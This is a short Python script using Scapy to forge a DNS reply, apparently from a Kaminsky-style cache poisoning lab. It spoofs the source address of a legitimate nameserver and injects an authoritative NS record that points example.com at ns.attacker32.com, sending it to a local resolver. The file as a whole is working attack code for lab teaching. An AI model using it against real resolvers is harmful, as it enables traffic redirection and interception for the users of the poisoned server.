#!/usr/bin/env python3
from scapy.all import*
#Create a DNS Query Record (Qdsec) with the qname (domain name) set to 'abcde.example.com'.
name='abcde.example.com'# random to ask
# target let the example.com nameserver to ns.attacker32.com
domain = 'example.com'
ns = 'ns.attacker32.com' 
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0,qd=Qdsec, an=Anssec, ns=NSsec)
# set the dst to our Local_DNS_Server
ip = IP(dst='10.9.0.53', src='199.43.153.53')
# set src as the legitimate nameserver of a.iana-servers.net 
# as we said, to simplify , the local_DNS_Server dport is 33333
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns
send(reply)
